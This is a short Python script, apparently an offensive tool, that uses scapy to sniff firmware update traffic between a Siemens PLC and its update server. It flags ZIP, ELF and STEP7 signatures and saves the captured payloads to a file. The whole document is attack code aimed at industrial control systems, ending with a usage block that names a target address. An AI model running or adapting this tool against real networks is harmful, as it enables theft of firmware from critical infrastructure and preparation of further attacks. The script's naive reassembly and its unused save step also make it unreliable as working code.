# firmware_interceptor.py - MitM firmware update traffic
from scapy.all import *
import hashlib

class FirmwareInterceptor:
    def __init__(self, target_plc, update_server):
        self.target = target_plc
        self.server = update_server
        self.firmware_chunks = []

    def packet_handler(self, pkt):
        # Intercept HTTP firmware downloads
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            payload = pkt[Raw].load

            # Detect firmware transfer (look for known headers)
            if b'PK\x03\x04' in payload:  # ZIP file
                print("[+] Detected firmware ZIP transfer")
                self.firmware_chunks.append(payload)

            elif payload.startswith(b'\x7fELF'):  # ELF binary
                print("[+] Detected ELF firmware binary")
                self.firmware_chunks.append(payload)

            # Siemens S7 firmware signature
            elif b'SiemensAG' in payload or b'STEP7' in payload:
                print("[+] Detected Siemens firmware")
                self.firmware_chunks.append(payload)

    def start_capture(self):
        """Sniff network for firmware transfers"""
        filter_str = f"host {self.target} and host {self.server}"
        sniff(filter=filter_str, prn=self.packet_handler, store=0)

    def save_firmware(self, output_file):
        """Reconstruct and save captured firmware"""
        firmware = b''.join(self.firmware_chunks)
        with open(output_file, 'wb') as f:
            f.write(firmware)

        print(f"[+] Saved {len(firmware)} bytes to {output_file}")
        print(f"[+] MD5: {hashlib.md5(firmware).hexdigest()}")

# Usage
interceptor = FirmwareInterceptor("10.10.10.50", "update.siemens.com")
interceptor.start_capture()
